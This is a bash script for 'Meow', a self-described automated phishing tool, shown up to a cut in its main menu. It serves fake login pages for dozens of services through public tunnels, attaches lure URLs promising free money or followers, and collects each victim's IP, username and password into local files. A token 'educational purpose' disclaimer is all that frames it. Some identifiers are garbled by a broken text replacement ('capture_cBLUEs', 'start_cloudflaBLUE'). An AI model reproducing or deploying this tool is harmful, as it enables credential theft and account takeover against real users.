#!/bin/bash

##   Meow 	   : 	Automated Phishing Tool
##   Author 	: 	Keshava reddy 
##   Version 	: 	1.0
##   Github 	: 	https://github.com/Keshavah-reddy/Meow


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2022  Keshavah-reddy (https://github.com/Keshavah-reddy)
##

__version__="1.1"

## ANSI colors (FG & BG)
BLUE="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
BLUEBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${BLUE}[${WHITE}!${BLUE}]${BLUE} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${BLUE}[${WHITE}!${BLUE}]${BLUE} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php ngrok cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

## Banner
banner() {
	cat <<- EOF
		${ORANGE} 
		${ORANGE}  __  __                    
		${ORANGE} |  \/  | ___  _____      __
		${ORANGE} | |\/| |/ _ \/ _ \ \ /\ / /
		${ORANGE} | |  | |  __/ (_) \ V  V / 
		${ORANGE} |_|  |_|\___|\___/ \_/\_/  ${BLUE}Version : ${__version__}

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Keshavah-reddy (@keshavah_reddy)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${RED}  __  __                    
		${RED} |  \/  | ___  _____      __
		${RED} | |\/| |/ _ \/ _ \ \ /\ / /
		${RED} | |  | |  __/ (_) \ V  V / 
		${RED} |_|  |_|\___|\___/ \_/\_/  {WHITE} ${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${BLUE}:  ${ORANGE}Keshava reddy ${BLUE}[ ${ORANGE} Keshavah_reddy${BLUE}]
		${GREEN} Github   ${BLUE}:  ${CYAN}https://github.com/Keshavah-reddy
		${GREEN} Social   ${BLUE}:  ${CYAN}https://instagram.com/keshavah_reddy
		${GREEN} Version  ${BLUE}:  ${ORANGE}${__version__}

		${WHITE} ${BLUEBG}Warning:${RESETBG}
		${CYAN}  This Tool is made for educational purpose 
		  only ${BLUE}!${WHITE}${CYAN} Author will not be responsible for 
		  any misuse of this toolkit ${BLUE}!${WHITE}
		
		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
		  KasRoudra, sepp0, ThelinuxChoice, Yisus7u7

		${BLUE}[${WHITE}00${BLUE}]${ORANGE} Main Menu     ${BLUE}[${WHITE}99${BLUE}]${ORANGE} Exit

	EOF

	read -p "${BLUE}[${WHITE}-${BLUE}]${GREEN} Select an option : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
#DEFAULT PORT
PORT='8080' 

#COUSTOM PORT
cusport() {
	echo ""
	read -n1 -p "${BLUE}[${WHITE}?${BLUE}]${ORANGE} Do You Want A Coustom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		printf "\n\n"
		read -n4 -p "${BLUE}[${WHITE}-${BLUE}]${ORANGE} Enter Your Custom 4-digit Port 1024-9999 : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo ""
		else
			echo -ne "\n\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
                        { sleep 2; clear; banner; cusport; }
		fi
	elif [[ ${P_ANS} =~ ^([Nn])$ ]];then
		echo -ne "\n\n${BLUE}[${WHITE}-${BLUE}]${BLUE} Using Default Port : $PORT...${WHITE}"
		echo ""
	else 
		echo ""
                echo -ne "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid Option, Try Again...${WHITE}"
		cusport
	fi
}
setup_site() {
    	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} Setting up server..."${WHITE}
	cp -rf sites/"$website"/* .server/www
	cp -f sites/ip.php .server/www/
	echo -ne "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_cBLUEs() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${BLUE}[${WHITE}-${BLUE}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${BLUE}[${WHITE}-${BLUE}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Login info Found !!"
			capture_cBLUEs
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	cusport
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -e "\n"
	read -n1 -p "${BLUE}[${WHITE}-${BLUE}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
	echo -e "\n\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Launching Ngrok..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
	fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## Start Cloudflared
start_cloudflared() { 
    rm .cld.log > /dev/null 2>&1 &
        cusport
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${BLUE}[${WHITE}!${BLUE}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${BLUE}[${WHITE}-${BLUE}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose (Again...)
start_loclx() {
	cusport
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${BLUE}[${WHITE}-${BLUE}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-BLUEirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-BLUEirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	{ sleep 12; clear; banner_small; }
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
	capture_data
}

## Start localhost
start_localhost() {
	cusport
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${BLUE}[${WHITE}01${BLUE}]${ORANGE} Localhost
		${BLUE}[${WHITE}02${BLUE}]${ORANGE} Ngrok.io     ${BLUE}[${CYAN}Account Needed${BLUE}]
		${BLUE}[${WHITE}03${BLUE}]${ORANGE} Cloudflared  ${BLUE}[${CYAN}Auto Detects${BLUE}]
		${BLUE}[${WHITE}04${BLUE}]${ORANGE} LocalXpose   ${BLUE}[${CYAN}NEW! Max 15Min${BLUE}]

	EOF

	read -p "${BLUE}[${WHITE}-${BLUE}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflaBLUE;;
		4 | 04)
			start_loclx;;
		*)
			echo -ne "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
site_facebook() {
	cat <<- EOF

		${BLUE}[${WHITE}01${BLUE}]${ORANGE} Traditional Login Page
		${BLUE}[${WHITE}02${BLUE}]${ORANGE} Advanced Voting Poll Login Page
		${BLUE}[${WHITE}03${BLUE}]${ORANGE} Fake Security Login Page
		${BLUE}[${WHITE}04${BLUE}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${BLUE}[${WHITE}-${BLUE}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='http://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='http://make-your-facebook-secuBLUE-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='http://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${BLUE}[${WHITE}01${BLUE}]${ORANGE} Traditional Login Page
		${BLUE}[${WHITE}02${BLUE}]${ORANGE} Auto Followers Login Page
		${BLUE}[${WHITE}03${BLUE}]${ORANGE} 1000 Followers Login Page
		${BLUE}[${WHITE}04${BLUE}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${BLUE}[${WHITE}-${BLUE}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='http://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='http://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${BLUE}[${WHITE}01${BLUE}]${ORANGE} Gmail Old Login Page
		${BLUE}[${WHITE}02${BLUE}]${ORANGE} Gmail New Login Page
		${BLUE}[${WHITE}03${BLUE}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${BLUE}[${WHITE}-${BLUE}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${BLUE}[${WHITE}01${BLUE}]${ORANGE} Traditional Login Page
		${BLUE}[${WHITE}02${BLUE}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${BLUE}[${WHITE}-${BLUE}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='http://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${BLUE}[${WHITE}::${BLUE}]${ORANGE} Select An Attack For Your Victim ${BLUE}[${WHITE}::${BLUE}]${ORANGE}

		${BLUE}[${WHITE}01${BLUE}]${ORANGE} Facebook      ${BLUE}[${WHITE}11${BLUE}]${ORANGE} Twitch       ${BLUE}[${WHITE}21${BLUE}]${ORANGE} DeviantArt
		${BLUE}[${WHITE}02${BLUE}]${ORANGE} Instagram     ${BLUE}[${WHITE}12${BLUE}]${ORANGE} Pinterest    ${BLUE}[${WHITE}22${BLUE}]${ORANGE} Badoo
		${BLUE}[${WHITE}03${BLUE}]${ORANGE} Google        ${BLUE}[${WHITE}13${BLUE}]${ORANGE} Snapchat     ${BLUE}[${WHITE}23${BLUE}]${ORANGE} Origin
		${BLUE}[${WHITE}04${BLUE}]${ORANGE} Microsoft     ${BLUE}[${WHITE}14${BLUE}]${ORANGE} Linkedin     ${BLUE}[${WHITE}24${BLUE}]${ORANGE} DropBox	
		${BLUE}[${WHITE}05${BLUE}]${ORANGE} Netflix       ${BLUE}[${WHITE}15${BLUE}]${ORANGE} Ebay         ${BLUE}[${WHITE}25${BLUE}]${ORANGE} Yahoo		
		${BLUE}[${WHITE}06${BLUE}]${ORANGE} Paypal        ${BLUE}[${WHITE}16${BLUE}]${ORANGE} Quora        ${BLUE}[${WHITE}26${BLUE}]${ORANGE} Wordpress
		${BLUE}[${WHITE}07${BLUE}]${ORANGE} Steam         ${BLUE}[${WHITE}17${BLUE}]${ORANGE} Protonmail   ${BLUE}[${WHITE}27${BLUE}]${ORANGE} Yandex			
		${BLUE}[${WHITE}08${BLUE}]${ORANGE} Twitter       ${BLUE}[${WHITE}18${BLUE}]${ORANGE} Spotify      ${BLUE}[${WHITE}28${BLUE}]${ORANGE} StackoverFlow
		${BLUE}[${WHITE}09${BLUE}]${ORANGE} Playstation   ${BLUE}[${WHITE}19${BLUE}]${ORANGE} BLUEdit       ${BLUE}[${WHITE}29${BLUE}]${ORANGE} Vk
		${BLUE}[${WHITE}10${BLUE}]${ORANGE} Tiktok        ${BLUE}[${WHITE}20${BLUE}]${ORANGE} Adobe        ${BLUE}[${WHITE}30${BLUE}]${ORANGE} XBOX
		${BLUE}[${WHITE}31${BLUE}]${ORANGE} Mediafire     ${BLUE}[${WHITE}32${BLUE}]${ORANGE} Gitlab       ${BLUE}[${WHITE}33${BLUE}]${ORANGE} Github
		${BLUE}[${WHITE}34${BLUE}]${ORANGE} Discord

		${BLUE}[${WHITE}99${BLUE}]${ORANGE} About         ${BLUE}[${WHITE}00${BLUE}]${ORANGE} Exit

	EOF
	
	read -p "${BLUE}[${WHITE}-${BLUE}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='http://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='http://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='http://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='http://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='http://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='http://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='http://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='http://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='http://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='http://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='http://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='http://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='http://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
